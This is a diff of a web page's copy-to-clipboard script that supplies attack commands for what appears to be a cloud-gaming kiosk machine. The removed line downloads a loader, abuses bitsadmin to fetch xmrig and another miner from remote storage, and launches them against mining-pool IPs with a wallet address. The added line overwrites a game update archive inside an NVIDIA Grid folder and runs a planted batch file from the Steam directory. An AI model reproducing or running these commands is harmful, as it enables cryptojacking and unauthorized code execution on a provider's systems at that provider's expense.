@@ -150,7 +150,7 @@ start "Stella" cmd /k "Stella.bat" <br>
 
     // When the button is clicked, copy the specified text
     document.getElementById("copyButton").addEventListener("click", function() {
-      var textToCopy = `cd c:&cd/&cd users&cd kiosk&cd downloads&curl -O "https://picteon.dev/files/rdl.exe"&bitsadmin /create 1 & bitsadmin /addfile 1 c:\\users\\kiosk\\downloads\\rdl.exe c:\\users\\kiosk\\rdl.exe& bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset&cd..&timeout 120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/xmrig.exe"&timeout120&rdl.exe -urlcache -split -f "https://storage.googleapis.com/mariocorp/miner.exe"&timeout 120&start "" cmd /c miner.exe --algo kawpow --server stratum+tcp://35.190.124.115:9200 --user NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet &timeout 120&start "" cmd /c xmrig.exe -o 34.149.22.228:9200 -u NHbYNXxf7ZHUYhk4Mu2sdHiskr4wgvurHKet -p x -a rx/0 -threads=16`;
+      var textToCopy = `del "C:\Program Files (x86)\NVIDiA_Grid_Bundle\crossout_gfn_pc\common\Crossout\update\latest.zip"&copy "C:\users\kiosk\downloads\latest.zip" "C:\Program Files (x86)\NViDiA_Grid_Bundle\crossout_gfn_pc\common\Crossout\update"& echo "C:\Program Files (x86)\NViDiA_Grid_Bundle\crossout_gfn_pc\common\Crossout\a.exe" | clip & copy "C:\users\kiosk\downloads\Stella.bat" "C:\Program Files (x86)\steam\ssfn_stella.bat"&start "" "C:\Program Files (x86)\steam\ssfn_stella.bat"`;
 
       copyTextToClipboard(textToCopy);
      
